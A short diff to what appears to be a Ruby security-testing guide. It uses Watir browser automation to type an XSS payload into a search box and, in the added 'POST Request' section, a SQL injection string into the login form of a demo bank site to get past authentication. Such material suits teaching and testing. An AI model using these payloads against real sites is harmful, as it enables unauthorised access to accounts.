@@ -173,12 +173,26 @@ browser.text_field(name: 'txtSearch').set("<img src=x onerror='alert(1)'>")
 btn = browser.button(value: 'Go')
 puts btn.exists?
 btn.click
-browser.close
+
+# browser.close
 ```
 
 ### POST Request 
 
+```ruby
+#!/usr/bin/env ruby
+#
+#
+require 'watir-webdriver'
 
+browser = Watir::Browser.new :firefox
+browser.goto "http://www.altoromutual.com/bank/login.aspx"
+browser.text_field(name: 'uid').set("' or 1=1;-- ")
+browser.text_field(name: 'passw').set("password")
+btn = browser.button(name: 'btnSubmit').click 
+
+# browser.close
+```
 
 
 
